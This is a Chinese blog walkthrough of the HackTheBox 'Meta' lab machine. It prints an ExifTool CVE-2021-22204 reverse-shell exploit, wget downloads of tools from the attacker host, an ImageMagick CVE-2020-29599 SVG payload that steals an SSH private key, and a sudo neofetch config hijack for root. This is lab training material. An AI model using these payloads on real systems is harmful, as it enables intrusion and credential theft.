> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/cSc9ekspQWfGqj42DW8KBg)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 107篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtpDMjEj17RDEbpaRUUk29ygHvJ37ic8pSWv8txuFndrk71AnsjTwxiaGtCngxeUFKllCs3NCg3vIhw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

```
`靶机信息``靶机地址:``https://app.hackthebox.com/machines/Meta``靶场: HackTheBox.com``靶机名称: Meta``难度: 中等``提示信息:``无``目标:  user.txt和root.txt`
```

```
`实验环境``攻击机:Vbox Manjaro 10.10.16.43``靶机:10.10.11.140`
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -p- 10.10.11.140
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
sudo nmap -sC -sV -p- 10.0.0.140 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫描到22和80端口开放，先来看看80端口

Web渗透
-----

```
curl -I 10.10.11.140
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

需要绑定域名

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

绑定后继续访问

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问后未发现可利用信息，做个目录扫描

```
sudo dirsearch -u http://artcorp.htb/ -e php,html,txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

目录扫描同样未发现可利用信息，猜测需要暴破子域名

```
gobuster vhost -u artcorp.htb -w ../../Dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现子域名dev01，绑定后继续访问

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问后只一个链接，提示是个正在开发准备测试的程序，先来访问链接

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问后出现一个上传功能，提示说上传图片显示图片相关信息，随便上传个图片试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

web中获取图片信息常用的工具就有ExifTool，看这个结果很相似如果是同一款工具可以利用RCE漏洞。用ExifTool来试试读取同一样张图片的结果

```
exiftools 1.png
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

可以看到获取到的信息是相同的，可以确认靶机上用的就是ExifTool。生成一张恶意图片，上传后ExifTools工具会执行这个漏洞达到反弹shell的目地，来验证下。

1。生成恶意图片

exp仓库：

```
https://github.com/convisolabs/CVE-2021-22204-exiftool
```

下载并修改exp

```
`git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git``cd cve-2021-22204-exiftool``nano exploit.py`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里需要修改exploit.py中的反弹shell地址和端口

1。执行exp生成恶意图片

```
py3 exploit.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

提示图片更新了，文件名是image.jpg，

2。在攻击机上监听4444端口

```
nc -lnvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3。上传恶意图片

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

反弹成功，先切换交互式shell，再来找找敏感信息

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm``Ctrl+z快捷键``stty raw -echo;fg``reset`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

切换完成，来找找敏感信息

```
cat /etc/passwd
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现thomas用户，继续找

上传辅助脚本并执行检查敏感信息

```
`wget http://10.10.16.7:8000/linpeas.sh``chmod +x linpeas.sh``./linpeas.sh`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

未发现可利用的信息，再上传pspy6检查后台运行程序

```
`wget http://10.10.16.7:8000/pspy64``chmod +x pspy64``./pspy64`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现用户thomas身份在后台每分钟执行一次convert_images.sh脚本，来看看这个脚本

```
`ls -al /usr/local/bin/convert_images.sh``cat /usr/local/bin/convert_images.sh`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

程序在后台执行了mogrify命令，来看看这个命令

```
mogrify -version
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

通过-h找到查看版本参数，使用参数找到版本号为ImageMagick 7.0.10-36，来找找这个版本有没有漏洞可利用

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

通过搜索引擎找到这个版本的漏洞编号CVE-2020-29599，来验证一下

```
https://github.com/coco0x0a/CVE-2020-29599
```

github上找到个exp

exploit.svg（在执行pspy64时还看到一条定时执行的命令会清空/tmp目录下的文件，所以将文件和输出结果放到一个有写权限的目录下）

```
``<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>`` `<read file/>` `<get width="base-width" height="base-height" />` `<resize geometry="400x400" />` `<write file />` `<svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">``  <image xlink:href="msl:exploit.svg" height="100" width="100"/>` `</svg>``</image>`
```

将exploit.svg上传到靶机上并复制到/var/www/dev01.artcorp.htb/convert_images/目录下，然后等待后台程序运行，运行后会在/dev/shm目录下生成id_rsa文件

```
`wget http://10.10.16.7:8000/exploit.svg``cp exploit.svg /var/www/dev01.artcorp.htb/convert_images/`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

等待后台程序运行，如果看到/var/www/dev01.artcorp.htb/convert_images/目录下的exploit.svg消失就是被后台程序执行了，此时到/dev/shm目录下查看是exp输出的id_rsa文件（不知道是不是打靶机的人有点多的问题，这个exp复制了很多次才成功）

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到id_rsa文件了，但是需要修改下格式，然后登录SSH

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
ssh thomas@10.10.11.140 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录成功，来找找敏感信息

```
cat user.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到user.txt，继续

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现可以使用root用户身份执行neofetch命令，来看看这个命令如何提权

```
https://gtfobins.github.io/gtfobins/neofetch/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

知道如何提权，来验证一下

```
sudo /usr/bin/neofetch --config exec /bin/bash
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

无法执行要换个方法，原因是neofetch后面没有加 \ “\” 系统认为你执行了另一个程序，所以还需要想其他方法

经过搜索引擎查找发现可以在配置文件里可以执行命令（有些文章会讲到全用自定命令)，如：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`cd /home/thomas/.config/neofetch``ls -al`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在用户目录下找到/home/thomas/.config/neofetch目录下找到neofetch的配置文件，试着在配置文件最上方添加反弹shell

```
nano config.conf
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在攻击机上监听3333端口

```
nc -nlvp 3333
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

执行neofetch命令，由于neofetch程序提权的时候，因为使用了sudo，所以不会执行thomas用户目录下的配置文件，还需要修改配置文件的环境变量

```
export XDG_CONFIG_HOME="$HOME/.config"
```

执行neofetch

```
sudo /usr/bin/neofetch \"\"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

提权成功，来找找flag

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)